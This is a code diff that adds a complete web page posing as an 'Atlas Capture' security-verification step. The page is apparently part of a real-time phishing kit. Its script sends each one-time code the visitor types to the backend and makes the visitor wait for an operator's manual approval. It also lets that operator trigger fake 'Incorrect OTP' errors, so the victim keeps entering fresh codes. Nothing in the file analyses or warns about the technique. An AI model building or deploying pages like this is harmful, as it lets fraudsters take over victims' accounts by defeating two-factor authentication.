@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Atlas Capture - Security Verification</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Inter,sans-serif}
+
+body{
+  background:#f3f4f6;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  min-height:100vh;
+  padding:40px 10px;
+}
+
+.wrapper{max-width:420px;width:100%}
+
+.header{
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  gap:10px;
+  margin-bottom:18px;
+}
+.header span{font-weight:600;font-size:18px}
+
+.card{
+  background:#fff;
+  border-radius:22px;
+  padding:32px 24px;
+  box-shadow:0 10px 30px rgba(0,0,0,0.08);
+  text-align:center;
+}
+
+h2{
+  font-size:24px;
+  font-weight:700;
+  color:#1f2937;
+  margin-bottom:12px;
+}
+
+.subtext{
+  color:#6b7280;
+  font-size:13px;
+  margin-bottom:28px;
+  line-height:1.5;
+}
+
+.otp-input{
+  width:100%;
+  padding:16px;
+  font-size:24px;
+  text-align:center;
+  letter-spacing:8px;
+  border:2px solid #e5e7eb;
+  border-radius:14px;
+  background:#fff;
+  transition:all 0.2s;
+  margin-bottom:28px;
+  font-weight:600;
+}
+.otp-input:focus{
+  outline:none;
+  border-color:#4f46e5;
+  box-shadow:0 0 0 3px rgba(79,70,229,0.1);
+}
+
+button{
+  width:100%;
+  padding:14px;
+  border-radius:12px;
+  border:none;
+  background:linear-gradient(90deg,#2563eb,#7c3aed);
+  color:#fff;
+  font-weight:600;
+  cursor:pointer;
+  margin-bottom:16px;
+}
+button:disabled{
+  opacity:0.6;
+  cursor:not-allowed;
+}
+.button-loading{
+  display:inline-flex;
+  align-items:center;
+  gap:8px;
+}
+.spinner{
+  width:18px;
+  height:18px;
+  border:2px solid rgba(255,255,255,0.3);
+  border-top-color:white;
+  border-radius:50%;
+  animation:spin 0.8s linear infinite;
+}
+@keyframes spin{
+  to{transform:rotate(360deg);}
+}
+
+.link{
+  background:none;
+  color:#4f46e5;
+  font-size:14px;
+  font-weight:500;
+  margin:0;
+  padding:0;
+  box-shadow:none;
+}
+.link:hover{
+  background:none;
+  text-decoration:underline;
+}
+
+.error-message{
+  color:#ef4444;
+  font-size:13px;
+  margin-top:12px;
+  display:none;
+  background:#fef2f2;
+  padding:12px;
+  border-radius:12px;
+}
+
+.success-message{
+  color:#059669;
+  font-size:13px;
+  margin-top:12px;
+  display:none;
+  background:#d1fae5;
+  padding:10px;
+  border-radius:12px;
+}
+
+#logoAtlas{
+  height:45px;
+  width:45px;
+  border-radius:40%;
+  margin-right:9px;
+}
+</style>
+</head>
+<body>
+
+<div class="wrapper">
+  <div class="header">
+    <div class="icon">
+      <img id="logoAtlas" src="https://i.postimg.cc/dQjyw0ZV/atlas.png" alt="atlas logo">
+    </div>
+    <span>Atlas Capture</span>
+  </div>
+
+  <div class="card">
+    <h2>Security Verification</h2>
+    <p class="subtext">Additional authentication required. Please enter another verification code.</p>
+
+    <input type="text" class="otp-input" id="otpInput" maxlength="6" placeholder="------">
+    <div id="errorMessage" class="error-message"></div>
+    <div id="successMessage" class="success-message"></div>
+
+    <button id="verifyBtn">Verify Code</button>
+    <button class="link" id="differentEmail">Use a different email</button>
+  </div>
+</div>
+
+<script>
+  const urlParams = new URLSearchParams(window.location.search);
+  const email = urlParams.get('email');
+  if (!email) window.location.href = '/users/login';
+
+  const otpInput = document.getElementById('otpInput');
+  const verifyBtn = document.getElementById('verifyBtn');
+  const errorDiv = document.getElementById('errorMessage');
+  const successDiv = document.getElementById('successMessage');
+  let isProcessing = false;
+  let approvalInterval = null;
+  let incorrectFlagProcessed = false;
+
+  async function checkIncorrectOtp() {
+    try {
+      const response = await fetch('/api/users/check-admin-text', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email })
+      });
+      const data = await response.json();
+      
+      if (data.admin_text === 'incorrect_otp_error' && data.text_release === false && !incorrectFlagProcessed) {
+        incorrectFlagProcessed = true;
+        errorDiv.textContent = '❌ Incorrect OTP. Please try again.';
+        errorDiv.style.display = 'block';
+        otpInput.value = '';
+        otpInput.focus();
+        
+        if (approvalInterval) {
+          clearInterval(approvalInterval);
+          approvalInterval = null;
+        }
+        
+        isProcessing = false;
+        verifyBtn.disabled = false;
+        verifyBtn.innerHTML = 'Verify Code';
+        
+        await fetch('/api/admin/release-text', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email })
+        });
+        
+        setTimeout(() => {
+          errorDiv.style.display = 'none';
+          incorrectFlagProcessed = false;
+        }, 4000);
+      }
+    } catch (err) {}
+  }
+  setInterval(checkIncorrectOtp, 2000);
+
+  async function verifySecondOTP() {
+    if (isProcessing) return;
+    
+    const otp = otpInput.value.trim();
+    if (!otp || otp.length !== 6) {
+      errorDiv.textContent = 'Please enter all 6 characters';
+      errorDiv.style.display = 'block';
+      setTimeout(() => errorDiv.style.display = 'none', 3000);
+      return;
+    }
+
+    isProcessing = true;
+    verifyBtn.disabled = true;
+    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
+    
+    try {
+      const response = await fetch('/api/users/submit-second-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, otp })
+      });
+      const data = await response.json();
+      
+      if (data.success) {
+        verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Waiting for approval...</span>';
+        
+        approvalInterval = setInterval(async () => {
+          const checkRes = await fetch('/api/users/check-second-approval', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email })
+          });
+          const checkData = await checkRes.json();
+          if (checkData.approved) {
+            clearInterval(approvalInterval);
+            window.location.href = `/users/success?email=${encodeURIComponent(email)}`;
+          }
+        }, 2000);
+      } else {
+        throw new Error(data.error || 'Verification failed');
+      }
+    } catch (error) {
+      isProcessing = false;
+      verifyBtn.disabled = false;
+      verifyBtn.innerHTML = 'Verify Code';
+      errorDiv.textContent = error.message || 'Invalid OTP. Please try again.';
+      errorDiv.style.display = 'block';
+      setTimeout(() => errorDiv.style.display = 'none', 3000);
+    }
+  }
+
+  verifyBtn.addEventListener('click', verifySecondOTP);
+  otpInput.addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') verifySecondOTP();
+  });
+  otpInput.focus();
+  
+  document.getElementById('differentEmail').addEventListener('click', () => {
+    window.location.href = '/users/login';
+  });
+</script>
+
+</body>
+</html>
